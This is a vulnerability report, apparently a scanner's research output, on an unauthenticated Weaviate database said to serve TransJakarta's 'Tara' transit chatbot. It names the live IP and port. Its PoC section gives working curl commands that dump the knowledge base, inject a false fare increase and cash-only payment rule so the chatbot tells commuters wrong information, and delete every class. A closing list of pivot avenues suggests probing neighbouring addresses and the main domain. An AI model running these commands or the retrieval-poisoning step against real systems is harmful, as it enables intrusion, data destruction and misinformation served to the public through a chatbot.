# TransJakarta -- Unauth RWD on Jakarta Transit Chatbot Knowledge Base

**Date:** 2026-06-20
**Tool:** weavscan
**Severity:** CRITICAL
**Status:** CONFIRMED -- unauth read + write + delete

---

## Target

```
IP:       35.240.155.175
Port:     8080  (Weaviate)
Service:  Weaviate 1.31.2
Hosting:  Google Cloud Platform
Auth:     NONE
```

---

## Operator Attribution

**TransJakarta** -- PT Transportasi Jakarta. Operates the Jakarta BRT (Bus Rapid Transit) system -- the largest BRT network in the world by fleet size, serving 10+ million passengers annually.

Evidence:
- Class `Tj_dhai_kb` -- "Tj" prefix = TransJakarta, "dhai" = likely "dhai" chatbot agent name
- Content explicitly references "Transjakarta" and "Tara" (the TransJakarta chatbot persona)
- Routes reference Jakarta BRT corridors: "Koridor 2 Pulogadung Monas"
- Contact email: marketing@transjakarta.co.id
- Language: Bahasa Indonesia
- Content covers official TransJakarta policies (photography, payments, tenant leasing)

---

## Data (3 Classes, 86 Records)

| Class | Records | Content |
|-------|---------|---------|
| B62b91p9su1_kb | 32 | TransJakarta chatbot KB (set A) |
| Bip93b47vgp_kb | 22 | TransJakarta chatbot KB (set B) |
| Tj_dhai_kb | 32 | TransJakarta chatbot KB (set C -- main) |

Three classes likely represent multiple knowledge base versions or chatbot deployments.

### Schema (Tj_dhai_kb)

```
title    text    -- FAQ/topic title
context  text    -- full answer text (Bahasa Indonesia)
```

### Sample Records

```
title: "Rute Koridor Pulogadung Monas"
context: "Berikut Tara tampilkan Rute Koridor 2 Pulogadung Monas, silakan tekan
          bagian yang Kakak butuhkan ya (https://transjakarta.co.id/rute#monumen-1)"

title: "Kebijakan Sewa Tenant"
context: "Untuk perihal sewa tenant (stand) kakak dapat mengirimkan surat pengajuan
          via email dengan alamat marketing@transjakarta.co.id atau menghubungi
          085261996178."

title: "Jenis Kartu Yang Dapat Digunakan Di Rute Non BRT"
context: "Saat ini sistem pembayaran Transjakarta tap didalam Bus (TOB) hanya dapat
          menggunakan kartu uang elektronik..."

title: "Pengambilan Gambar/Video"
context: "Transjakarta memberikan izin kepada Pelanggan dalam melakukan kegiatan
          pengambilan foto dan video ya..."
```

---

## Access Matrix

| Operation | Result | HTTP |
|-----------|--------|------|
| Read | YES | 200 |
| Write | YES | 200 |
| Delete (object) | YES | 204 |
| Verify deleted | 404 | -- |

Canary: `2e00b9bf-4cc2-4608-9f59-898909d3850d` -- written to Tj_dhai_kb, deleted 204, verified 404.

---

## PoC

### Read -- Full chatbot knowledge base

```bash
TARGET=http://35.240.155.175:8080

for CLASS in B62b91p9su1_kb Bip93b47vgp_kb Tj_dhai_kb; do
  curl -s -X POST $TARGET/v1/graphql \
    -H "Content-Type: application/json" \
    -d "{\"query\":\"{ Get { $CLASS(limit: 100) { title context } } }\"}" \
    | jq ".data.Get.${CLASS}[]" >> transjakarta-kb.jsonl
done
```

### Write -- Inject false transit guidance

```bash
# Inject false route/policy information into chatbot
# Serves misinformation to Jakarta commuters
curl -s -X POST $TARGET/v1/batch/objects \
  -H "Content-Type: application/json" \
  -d '{
    "objects": [{
      "class": "Tj_dhai_kb",
      "properties": {
        "title": "Harga Tiket Koridor 1",
        "context": "Mulai 1 Juli 2026, harga tiket Koridor 1 naik menjadi Rp 10.000 per perjalanan. Pembayaran hanya melalui tunai di loket."
      }
    }]
  }'
# False fare increase and payment policy change served to commuters via Tara chatbot
```

### Delete -- Wipe all chatbot content

```bash
for CLASS in B62b91p9su1_kb Bip93b47vgp_kb Tj_dhai_kb; do
  curl -s -o /dev/null -w "DELETE $CLASS: %{http_code}\n" -X DELETE "$TARGET/v1/schema/$CLASS"
done
# TransJakarta Tara chatbot returns empty on all passenger queries
```

---

## Topology

```
node: node1  status=HEALTHY  version=1.31.2
lastSnapshotIndex: 0  (no recovery point)
```

---

## Impact

### Write -- Misinformation to 10 Million Annual Passengers

TransJakarta's chatbot ("Tara") is the primary digital information channel for Jakarta's BRT network. Injecting false fare prices, route changes, or payment policy information into the knowledge base causes the chatbot to serve misinformation to millions of daily commuters. False information about accepted payment methods, station closures, or emergency procedures could cause real-world harm -- passengers stranded at stations, incorrect emergency contact information, or fraudulent fare collection guidance.

### Write -- Contact Detail Manipulation

The knowledge base contains official TransJakarta contact details (email, phone numbers). Injecting fake contact records redirects passengers with complaints, lost property queries, or emergency reports to attacker-controlled channels.

### Delete -- Chatbot Outage

86 records across 3 classes wiped in three HTTP calls. "Tara" returns empty on all queries until re-ingested.

---

## Pivot Avenues

1. **GCP neighborhood** -- 35.240.155.0/24; other TransJakarta backend services may be co-located
2. **Multiple KB classes** -- 3 parallel knowledge bases suggest multiple chatbot deployments or A/B testing; investigate if any contain privileged operational data
3. **marketing@transjakarta.co.id** -- contact email exposed in knowledge base; use as disclosure channel
4. **transjakarta.co.id** -- main domain; check for additional exposed AI/API services

---

## Tool Reference

Found with **weavscan**.
https://github.com/nuclide-research/weavscan
